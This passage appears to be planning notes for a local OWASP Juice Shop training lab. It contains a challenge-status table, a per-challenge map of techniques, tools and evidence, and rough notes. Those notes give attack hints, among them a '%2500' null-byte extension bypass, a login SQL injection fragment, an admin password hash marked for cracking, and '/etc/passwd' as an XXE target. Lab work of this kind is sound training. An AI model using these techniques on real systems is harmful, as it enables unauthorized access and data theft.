| 4 | Admin Registration | 3 | Improper Input Validation | yes | yes/status 0 |
| 5 | Admin Section | 2 | Broken Access Control | yes | yes/status 0 |
| 6 | Arbitrary File Write | 6 | Vulnerable Components | yes | no |
| 7 | Bjoern's Favorite Pet | 3 | Broken Authentication | yes | yes/status 0 |
| 8 | Blockchain Hype | 5 | Security through Obscurity | yes | yes/status 0 |
| 9 | NFT Takeover | 2 | Sensitive Data Exposure | yes | yes/status 0 |
| 10 | Mint the Honey Pot | 3 | Improper Input Validation | yes | yes/status 0 |
| 11 | Wallet Depletion | 6 | Miscellaneous | yes | yes/status 0 |
| 12 | Web3 Sandbox | 1 | Broken Access Control | yes | yes/status 0 |
| 13 | Blocked RCE DoS | 5 | Insecure Deserialization | yes | no |
| 14 | CAPTCHA Bypass | 3 | Broken Anti Automation | yes | no |
| 15 | Change Bender's Password | 5 | Broken Authentication | yes | no |
| 16 | Christmas Special | 4 | Injection | yes | no |
| 17 | CSP Bypass | 4 | XSS | yes | no |
| 18 | Client-side XSS Protection | 3 | XSS | yes | no |
| 19 | Confidential Document | 1 | Sensitive Data Exposure | yes | yes/status 2 |
| 20 | DOM XSS | 1 | XSS | yes | yes/status 2 |
| 21 | Database Schema | 3 | Injection | yes | yes/status 0 |
| 22 | Deprecated Interface | 2 | Security Misconfiguration | yes | no |
| 23 | Easter Egg | 4 | Broken Access Control | yes | no |
| 24 | Email Leak | 5 | Sensitive Data Exposure | yes | no |
| 25 | Empty User Registration | 2 | Improper Input Validation | yes | no |
| 26 | Ephemeral Accountant | 4 | Injection | yes | no |
| 27 | Error Handling | 1 | Security Misconfiguration | yes | no |
| 28 | Expired Coupon | 4 | Improper Input Validation | yes | no |
| 29 | Extra Language | 5 | Broken Anti Automation | yes | no |
| 30 | Five-Star Feedback | 2 | Broken Access Control | yes | no |
| 31 | Forged Coupon | 6 | Cryptographic Issues | yes | no |
| 32 | Forged Feedback | 3 | Broken Access Control | yes | no |
| 33 | Forged Review | 3 | Broken Access Control | yes | yes/status 0 |
| 34 | Forged Signed JWT | 6 | Vulnerable Components | yes | no |
| 35 | Forgotten Developer Backup | 4 | Sensitive Data Exposure | yes | no |
| 36 | Forgotten Sales Backup | 4 | Sensitive Data Exposure | yes | no |
| 37 | Frontend Typosquatting | 5 | Vulnerable Components | yes | no |
| 38 | GDPR Data Erasure | 3 | Broken Authentication | yes | no |
| 39 | GDPR Data Theft | 4 | Sensitive Data Exposure | yes | no |
| 40 | HTTP-Header XSS | 4 | XSS | yes | no |
| 41 | Imaginary Challenge | 6 | Cryptographic Issues | yes | no |
| 42 | Leaked Access Logs | 5 | Observability Failures | yes | no |
| 43 | Leaked Unsafe Product | 4 | Sensitive Data Exposure | yes | no |
| 44 | Legacy Typosquatting | 4 | Vulnerable Components | yes | no |
| 45 | Login Admin | 2 | Injection | yes | yes/status 0 |
| 46 | Login Amy | 3 | Sensitive Data Exposure | yes | no |
| 47 | Login Bender | 3 | Injection | yes | yes/status 0 |
| 48 | Login Bjoern | 4 | Broken Authentication | yes | no |
| 49 | Login Jim | 3 | Injection | yes | yes/status 0 |
| 50 | Login MC SafeSearch | 2 | Sensitive Data Exposure | yes | no |
| 51 | Login Support Team | 6 | Security Misconfiguration | yes | no |
| 52 | Manipulate Basket | 3 | Broken Access Control | yes | no |
| 53 | Misplaced Signature File | 4 | Observability Failures | yes | no |
| 54 | Multiple Likes | 6 | Broken Anti Automation | yes | no |
| 55 | Nested Easter Egg | 4 | Cryptographic Issues | yes | no |
| 56 | NoSQL DoS | 4 | Injection | yes | no |
| 57 | NoSQL Exfiltration | 5 | Injection | yes | no |
| 58 | NoSQL Manipulation | 4 | Injection | yes | yes/status 0 |
| 59 | Outdated Allowlist | 1 | Unvalidated Redirects | yes | yes/status 0 |
| 60 | Password Strength | 2 | Broken Authentication | yes | yes/status 0 |
| 61 | Payback Time | 3 | Improper Input Validation | yes | no |
| 62 | Premium Paywall | 6 | Cryptographic Issues | yes | no |
| 63 | Privacy Policy | 1 | Miscellaneous | yes | no |
| 64 | Privacy Policy Inspection | 3 | Security through Obscurity | yes | no |
| 65 | Product Tampering | 3 | Broken Access Control | yes | yes/status 0 |
| 66 | Reflected XSS | 2 | XSS | yes | no |
| 67 | Repetitive Registration | 1 | Improper Input Validation | yes | no |
| 68 | Reset Bender's Password | 4 | Broken Authentication | yes | yes/status 0 |
| 69 | Reset Bjoern's Password | 5 | Broken Authentication | yes | yes/status 0 |
| 70 | Reset Jim's Password | 3 | Broken Authentication | yes | yes/status 0 |
| 71 | Reset Morty's Password | 5 | Broken Anti Automation | yes | yes/status 0 |
| 72 | Retrieve Blueprint | 5 | Sensitive Data Exposure | yes | no |
| 73 | SSRF | 6 | Broken Access Control | yes | no |
| 74 | SSTi | 6 | Injection | yes | no |
| 75 | Score Board | 1 | Miscellaneous | yes | yes/status 2 |
| 76 | Security Policy | 2 | Miscellaneous | yes | no |
| 77 | Server-side XSS Protection | 4 | XSS | yes | no |
| 78 | Steganography | 4 | Security through Obscurity | yes | no |
| 79 | Successful RCE DoS | 6 | Insecure Deserialization | yes | no |
| 80 | Supply Chain Attack | 5 | Vulnerable Components | yes | no |
| 81 | Two Factor Authentication | 5 | Broken Authentication | yes | no |
| 82 | Unsigned JWT | 5 | Vulnerable Components | yes | no |
| 83 | Upload Size | 3 | Improper Input Validation | yes | no |
| 84 | Upload Type | 3 | Improper Input Validation | yes | no |
| 85 | User Credentials | 4 | Injection | yes | yes/status 0 |
| 86 | Video XSS | 6 | XSS | yes | no |
| 87 | View Basket | 2 | Broken Access Control | yes | no |
| 88 | Vulnerable Library | 4 | Vulnerable Components | yes | no |
| 89 | Weird Crypto | 2 | Cryptographic Issues | yes | no |
| 90 | Allowlist Bypass | 4 | Unvalidated Redirects | yes | yes/status 0 |
| 91 | XXE Data Access | 3 | XXE | yes | no |
| 92 | XXE DoS | 5 | XXE | yes | no |
| 93 | Memory Bomb | 5 | Insecure Deserialization | yes | no |
| 94 | Zero Stars | 1 | Improper Input Validation | yes | no |
| 95 | Missing Encoding | 1 | Improper Input Validation | yes | no |
| 96 | Cross-Site Imaging | 5 | Security Misconfiguration | yes | no |
| 97 | Exposed Metrics | 1 | Observability Failures | yes | yes/status 2 |
| 98 | Deluxe Fraud | 3 | Improper Input Validation | yes | no |
| 99 | CSRF | 3 | Broken Access Control | yes | no |
| 100 | Bonus Payload | 1 | XSS | yes | yes/status 2 |
| 101 | Reset Uvogin's Password | 4 | Sensitive Data Exposure | yes | yes/status 0 |
| 102 | Meta Geo Stalking | 2 | Sensitive Data Exposure | yes | no |
| 103 | Visual Geo Stalking | 2 | Sensitive Data Exposure | yes | no |
| 104 | Kill Chatbot | 5 | Vulnerable Components | yes | no |
| 105 | Poison Null Byte | 4 | Improper Input Validation | yes | no |
| 106 | Bully Chatbot | 1 | Miscellaneous | yes | no |
| 107 | Local File Read | 5 | Vulnerable Components | yes | no |
| 108 | Mass Dispel | 1 | Miscellaneous | yes | no |
| 109 | Security Advisory | 3 | Miscellaneous | yes | no |
| 110 | Exposed credentials | 2 | Sensitive Data Exposure | yes | no |
| 111 | Leaked API Key | 5 | Sensitive Data Exposure | yes | no |

## Per-Challenge Research Map

This section is an informational planning map for the local OWASP Juice Shop lab. It records what can be investigated for each challenge, which tool or technique is likely useful, and what evidence should be captured for the report.

| ID | Challenge | What to Inspect | Tool or Technique | Evidence to Capture |
| --- | --- | --- | --- | --- |
| 1 | Password Hash Leak | Authenticated user profile responses and decoded JWT contents. | Burp Repeater, browser DevTools Network, JWT decoder. | Endpoint response or token claim exposing a password hash. |
| 2 | API-only XSS | REST endpoints that persist user-controlled text without using the frontend. | Burp Repeater or curl against feedback/review APIs. | Request body and rendered stored payload evidence. |
| 3 | Access Log | Publicly reachable log files, backup paths, and access-log naming patterns. | curl, directory enumeration, source route review. | URL returning server access log content. |
| 4 | Admin Registration | Registration API fields accepted by backend but not exposed by UI. | Burp intercept, mass-assignment testing. | Registration request containing extra role/admin property. |
| 5 | Admin Section | Hidden Angular route and role-gated navigation. | DevTools source search, route enumeration. | Admin route URL and screenshot/API proof of access. |
| 6 | Arbitrary File Write | Vulnerable dependency behavior and write-capable endpoints. | Source review, package/version research, controlled file-write test. | Request demonstrating overwrite of `/ftp/legal.md`. |
| 7 | Bjoern's Favorite Pet | Security question answer from OSINT or older public profile data. | Web search, Juice Shop docs/media clues. | Reset-password request using original answer. |
| 8 | Blockchain Hype | Encrypted announcement and hidden Token Sale route. | FTP enumeration, strings, Python crypto analysis. | Decrypted announcement text and `/#/tokensale-ico-ea` route. |
| 9 | NFT Takeover | Leaked mnemonic/private key path and `/juicy-nft` page. | Feedback API review, wallet key derivation, DevTools. | Seed phrase source and derived private key authentication result. |
| 10 | Mint the Honey Pot | Web3 bee collection flow and minting validation. | Browser DevTools, Web3 route inspection, traffic capture. | Requests/events showing collected BEEs and mint action. |
| 11 | Wallet Depletion | Deposit/withdraw transaction logic and arithmetic validation. | Burp Repeater, DevTools, Web3 wallet route review. | Request sequence withdrawing more than deposited. |
| 12 | Web3 Sandbox | Hidden Angular route for contract sandbox. | JS route grep, browser route access. | `/#/web3-sandbox` route screenshot. |
| 13 | Blocked RCE DoS | Insecure deserialization path and hardened blocking behavior. | Source review, dependency review, non-destructive payload analysis. | Evidence showing blocked/handled RCE attempt without crashing lab. |
| 14 | CAPTCHA Bypass | CAPTCHA generation and feedback submission timing. | Burp Repeater, curl loop, `GET /rest/captcha/`. | Ten feedback submissions inside the time window. |
| 15 | Change Bender's Password | Password-change endpoint authorization rules. | Burp Repeater with account switching, JWT/session comparison. | Request changing Bender password without SQLi or reset flow. |
| 16 | Christmas Special | Product availability and order/cart SQLi or hidden product ID. | SQLi testing, product API review, basket/order API. | Basket/order request containing Christmas 2014 product. |
| 17 | CSP Bypass | Legacy page that reflects username under weaker CSP handling. | DevTools, route/source search, controlled XSS test. | Alert payload executing on the legacy page. |
| 18 | Client-side XSS Protection | Frontend validation that can be bypassed via direct API call. | Burp Repeater, feedback/review API testing. | Stored payload accepted despite UI blocking it. |
| 19 | Confidential Document | Exposed `/ftp` directory contents. | Browser, curl, directory listing. | Downloaded confidential document URL/content. |
| 20 | DOM XSS | Search route DOM rendering of URL input. | Browser URL encoding, DevTools console. | `/#/search?q=...` route triggering alert. |
| 21 | Database Schema | SQL injection path exposing SQLite schema metadata. | Login/search SQLi, UNION queries, Burp Repeater. | Extracted table/schema names from database metadata. |
| 22 | Deprecated Interface | Old B2B or XML upload/import endpoint. | Route/source search, endpoint probing. | Deprecated endpoint request and accepted response. |
| 23 | Easter Egg | Hidden route/file or suspicious static asset. | Source grep, `/ftp` review, route enumeration. | URL or asset revealing the easter egg. |
| 24 | Email Leak | Cross-origin or XS-leak behavior exposing email data. | Browser origin tests, DevTools Network, CORS review. | Cross-domain response or side-channel evidence. |
| 25 | Empty User Registration | Backend validation mismatch for empty credentials. | Burp intercept on `/api/Users/`. | Registration request with empty email/password accepted. |
| 26 | Ephemeral Accountant | Login SQLi that impersonates a non-existing accountant user. | Login-form SQLi, Burp Repeater. | Auth response/session for `acc0unt4nt@juice-sh.op`. |
| 27 | Error Handling | Input that triggers unhandled or verbose server error. | Browser, Burp, malformed route/API request. | Error page/JSON stack trace. |
| 28 | Expired Coupon | Coupon validation date logic and campaign codes. | Coupon files, Burp Repeater, system time/request testing. | Expired coupon accepted at checkout. |
| 29 | Extra Language | Translation loading mechanism and hidden language file. | DevTools Network, i18n asset enumeration. | Request loading the extra language. |
| 30 | Five-Star Feedback | Admin feedback management and insecure delete/update access. | Admin UI, Burp Repeater, feedback API. | Removal/update of all five-star feedback entries. |
| 31 | Forged Coupon | Coupon code format, signing/encryption, and old backup files. | Backup review, crypto analysis, Python scripting. | Forged coupon with at least 80 percent discount. |
| 32 | Forged Feedback | Feedback API trusts user identity fields. | Burp Repeater, parameter tampering. | Feedback posted under another user's identity. |
| 33 | Forged Review | Product review API authorization gaps. | Burp Repeater, product review endpoints. | Review created/edited as another user. |
| 34 | Forged Signed JWT | JWT library weakness around RSA signature validation. | JWT tooling, library/CVE research, token comparison. | Accepted token for `rsa_lord@juice-sh.op`. |
| 35 | Forgotten Developer Backup | Backup files reachable through `/ftp` with bypass. | FTP listing, poison-null-byte style filename testing. | Developer backup file download. |
| 36 | Forgotten Sales Backup | Sales backup reachable through `/ftp` with bypass. | FTP listing, curl download, extension bypass. | Sales backup file download. |
| 37 | Frontend Typosquatting | Frontend dependencies with suspicious package names. | `package.json`, bundled JS search, npm package review. | Exact typosquatted package name reported via contact form. |
| 38 | GDPR Data Erasure | Erased account still authenticates or remains partially present. | Login testing, deleted-user API/state review. | Successful login with erased Chris account. |
| 39 | GDPR Data Theft | Data export endpoints with missing ownership checks. | Burp Repeater, IDOR testing. | Download/export of another user's personal data. |
| 40 | HTTP-Header XSS | Headers persisted into logs/UI without sanitization. | Burp Repeater, custom header injection. | Stored payload from HTTP header rendered in app. |
| 41 | Imaginary Challenge | Continue-code logic and non-existing challenge ID handling. | Continue-code analysis, hashids/code review. | Challenge #999 marked through crafted continue code. |
| 42 | Leaked Access Logs | Public internet leak containing credentials. | OSINT, search engines, challenge hints. | Original leaked log and matching account login. |
| 43 | Leaked Unsafe Product | OSINT leak identifying removed unsafe product ingredients. | Paste/leak search, product clue research. | Contact-form report with unsafe product/ingredients. |
| 44 | Legacy Typosquatting | Historical vulnerable dependency in older snapshot. | Version history, package lock review, OSINT. | Exact legacy typosquatting culprit submitted. |
| 45 | Login Admin | SQL injection in login email field. | Login form, Burp Repeater, SQLi syntax. | Admin auth response/session. |
| 46 | Login Amy | Password clue based on padded final-note pattern. | OSINT clue interpretation, targeted login attempt. | Amy login with original credentials. |
| 47 | Login Bender | Targeted SQL injection using known email. | Login form, Burp Repeater. | Auth response for Bender account. |
| 48 | Login Bjoern | OAuth/local auth implementation weakness. | Source review, OAuth flow analysis. | Bjoern Gmail account login without password reset or SQLi. |
| 49 | Login Jim | Targeted SQL injection using Jim's email. | Login form, Burp Repeater. | Auth response for Jim account. |
| 50 | Login MC SafeSearch | OSINT credentials from public media/persona clues. | Web search, username discovery. | Login request with original credentials. |
| 51 | Login Support Team | Hardcoded/default support credentials. | Source review, brute-force with known small wordlist. | Support team login request/response. |
| 52 | Manipulate Basket | Basket ownership and IDOR behavior. | Burp Repeater, basket ID tampering. | Another user's basket modified. |
| 53 | Misplaced Signature File | Exposed SIEM/Sigma signature file. | Static file enumeration, source grep. | URL returning misplaced signature content. |
| 54 | Multiple Likes | Review-like endpoint race/timing issue. | Burp Intruder/Repeater, parallel requests. | Same user liking one review at least three times. |
| 55 | Nested Easter Egg | Advanced decoding/crypto on first easter egg. | File analysis, stego/crypto tools. | Real nested easter egg content. |
| 56 | NoSQL DoS | NoSQL injection sleep/timing behavior. | Burp Repeater, non-destructive timing payload. | Measurable delayed response from server. |
| 57 | NoSQL Exfiltration | NoSQL query manipulation in order retrieval. | Burp Repeater, parameter tampering. | Orders returned beyond current user scope. |
| 58 | NoSQL Manipulation | Bulk update behavior in product reviews. | Burp Repeater, NoSQL operator testing. | Multiple reviews updated from one request. |
| 59 | Outdated Allowlist | Old crypto redirect allowlist entries left in bundled code. | JS grep, `/redirect?to=` testing. | Redirect through app to stale crypto address. |
| 60 | Password Strength | Weak admin password without SQLi. | Targeted password guessing, hash cracking. | Admin login using weak password. |
| 61 | Payback Time | Negative quantity/price/order validation. | Burp Repeater, basket/order API tampering. | Order total resulting in account credit. |
| 62 | Premium Paywall | Hidden premium route/key in client or static files. | Source grep, route/static asset review. | Access to paywalled premium content without payment. |
| 63 | Privacy Policy | Privacy policy route/content. | Browser navigation. | Privacy policy viewed. |
| 64 | Privacy Policy Inspection | Hidden proof phrase or inspect-only clue in policy. | DevTools Elements/source inspection. | Proof value submitted or challenge completion. |
| 65 | Product Tampering | Product API missing admin-only enforcement. | Burp Repeater, product endpoint update. | O-Saft description link changed to required URL. |
| 66 | Reflected XSS | Reflected route parameter or redirect/search field. | Browser encoded payload, DevTools. | Alert payload reflected and executed. |
| 67 | Repetitive Registration | Repeat-password client validation bypass. | Burp intercept, API registration. | Registration with empty/different repeat password. |
| 68 | Reset Bender's Password | Security question OSINT answer for Bender. | OSINT, reset-password endpoint. | Password reset request accepted for Bender. |
| 69 | Reset Bjoern's Password | Internal account security question answer. | OSINT, reset-password endpoint. | Password reset request accepted for Bjoern. |
| 70 | Reset Jim's Password | Security answer found from Jim's public clues. | OSINT, reset-password endpoint. | Password reset request accepted for Jim. |
| 71 | Reset Morty's Password | Obfuscated pet/security answer. | Hint analysis, targeted answer testing. | Morty reset accepted with decoded answer. |
| 72 | Retrieve Blueprint | Static file/route for product blueprint. | Directory/source search, product asset review. | Blueprint file downloaded. |
| 73 | SSRF | Server-side URL fetch or image/import feature. | Source review, Burp Repeater, localhost resource request. | Hidden internal resource returned through server. |
| 74 | SSTi | Template injection in a server-rendered feature. | Source review, controlled template expression testing. | Server-side template expression execution proof. |
| 75 | Score Board | Hidden route. | DevTools route search, direct navigation. | `/#/score-board` access. |
| 76 | Security Policy | Responsible disclosure/security policy file or route. | Browser/static file search. | Security policy viewed. |
| 77 | Server-side XSS Protection | Feedback sanitization bypass on server side. | Burp Repeater, payload mutation. | Stored XSS bypassing server-side filter. |
| 78 | Steganography | Hidden character in product image/media. | Image inspection, stego tools, metadata review. | Exact hidden character name reported. |
| 79 | Successful RCE DoS | Non-infinite command execution causing temporary occupation. | Source review, safe timing test in lab only. | Server busy evidence without infinite loop. |
| 80 | Supply Chain Attack | Public vulnerability affecting developer credentials. | OSINT, advisory/CVE search. | Original report/CVE submitted via contact form. |
| 81 | Two Factor Authentication | TOTP secret storage or 2FA flow weakness. | API/source review, TOTP tooling. | Valid 2FA code for `wurstbrot`. |
| 82 | Unsigned JWT | JWT algorithm handling weakness. | JWT tooling, token header/signature analysis. | Accepted unsigned token for `jwtn3d@juice-sh.op`. |
| 83 | Upload Size | Upload size validation mismatch. | Burp Repeater, generated file over 100 kB. | Oversized upload accepted. |
| 84 | Upload Type | Extension/content-type validation mismatch. | Burp Repeater, filename/content-type tampering. | Non-pdf/non-zip upload accepted. |
| 85 | User Credentials | SQLi UNION query against user table. | Burp Repeater, SQLi extraction. | List of user emails/password hashes. |
| 86 | Video XSS | Promo video metadata/source field injection. | Source/API review, payload in video data. | Payload embedded and executed from promo video. |
| 87 | View Basket | Basket IDOR through URL/API ID. | Browser URL change, Burp Repeater. | Another user's basket visible. |
| 88 | Vulnerable Library | Client/server dependency version with known CVE. | package lock review, `npm audit`, OSINT. | Exact library name/version submitted. |
| 89 | Weird Crypto | Weak/inappropriate crypto algorithm or library usage. | Source review, dependency review. | Contact report naming the weak crypto choice. |
| 90 | Allowlist Bypass | Open redirect allowlist parsing edge case. | Burp Repeater, URL parser tricks. | Redirect to disallowed destination through app. |
| 91 | XXE Data Access | XML upload/parser endpoint reading local files. | Burp Repeater, XML parser behavior review. | `/etc/passwd` or Windows file content returned. |
| 92 | XXE DoS | XML entity expansion behavior. | Safe lab-only XML parser test. | Delayed/heavy XML response evidence. |
| 93 | Memory Bomb | YAML/entity deserialization memory exhaustion. | Upload endpoint review, safe lab-only bomb test. | Endpoint accepts hazardous structured input. |
| 94 | Zero Stars | Feedback rating validation mismatch. | Burp Repeater, feedback API. | Feedback accepted with zero rating. |
| 95 | Missing Encoding | File path containing special characters. | Browser URL encoding, static file retrieval. | Bjoern cat photo retrieved. |
| 96 | Cross-Site Imaging | SVG/image URL injection into delivery labels. | Burp Repeater, order/address/delivery data tampering. | External cat image rendered on delivery boxes. |
| 97 | Exposed Metrics | Prometheus metrics endpoint. | Browser/curl endpoint discovery. | Metrics endpoint response. |
| 98 | Deluxe Fraud | Membership payment/status validation. | Burp Repeater, checkout/membership API review. | Deluxe membership obtained without valid payment. |
| 99 | CSRF | State-changing request without CSRF protection. | External HTML form, browser session. | Cross-origin request changing user name. |
| 100 | Bonus Payload | Required SoundCloud iframe in DOM XSS route. | URL encoding, browser search route. | Bonus iframe rendered/executed in search route. |
| 101 | Reset Uvogin's Password | OSINT answer for Uvogin's security question. | Web search, reset-password endpoint. | Password reset request accepted. |
| 102 | Meta Geo Stalking | Photo metadata reveals security answer. | EXIF tools, Photo Wall review. | GPS/location metadata and reset proof. |
| 103 | Visual Geo Stalking | Visual landmarks reveal security answer. | Image inspection, map/OSINT comparison. | Location answer and reset proof. |
| 104 | Kill Chatbot | Chatbot implementation/storage weakness. | Source/API review, chatbot endpoint testing. | Chatbot permanently disabled. |
| 105 | Poison Null Byte | Filename extension filter bypass. | curl, encoded `%2500` path testing. | Restricted file downloaded through null-byte bypass. |
| 106 | Bully Chatbot | Chatbot prompt/interaction for coupon. | Browser chatbot, conversation testing. | Coupon code returned by support chatbot. |
| 107 | Local File Read | Vulnerable local file read dependency/endpoint. | Source review, safe file-read proof in lab. | Arbitrary local file content returned. |
| 108 | Mass Dispel | Notification UI convenience action. | DevTools Elements, browser UI after restart. | Multiple solved notifications closed at once. |
| 109 | Security Advisory | Known affected advisory and checksum proof. | CSAF/advisory search, contact form. | Suitable checksum submitted. |
| 110 | Exposed credentials | Hardcoded client-side testing credentials. | Frontend JS grep, DevTools source search. | Exact exposed credential pair and login proof. |
| 111 | Leaked API Key | Client/server static code containing API key. | Source grep, bundled JS/static asset review. | Exact leaked API key submitted. |

## Rough Notes

- Unknown Angular routes return HTTP `200` with the app shell, so directory brute forcing needs response-length filtering.
- `/ftp` is a real sensitive data source even when the browser UI looks empty.
- `%2500.md` bypassed extension restrictions on backup files.
- The token sale route came from decrypted announcement content, not from brute forcing routes.
- Feedback API response exposed a Web3 mnemonic clue and a complaint upload hint.
- Upload functionality should be inspected with Burp before assuming it can lead to command execution.
- Authenticated API replay may require the `Authorization: Bearer <jwt>` header even when the browser also has a token cookie.
- Possible admin password hash to crack: `0192023a7bbd73250516f069df18b500`.
- The NFT page accepted a derived Ethereum private key, not a MetaMask wallet connection.
- Outdated crypto-address links must be visited through `/redirect?to=...`, not directly.
- Bare `1=1--` is not a complete login SQLi payload unless the input first closes the quoted email string.
- Amy's login is better solved from the password-padding clue than with broad brute force.
- Green entries in the admin registered-users view are useful progress evidence for confirmed logins.
- Accounting UI allowed product price edits to `1`, but the auto-refreshing quantity/amount fields mean this needs Burp/API replay for a reliable exploit path.
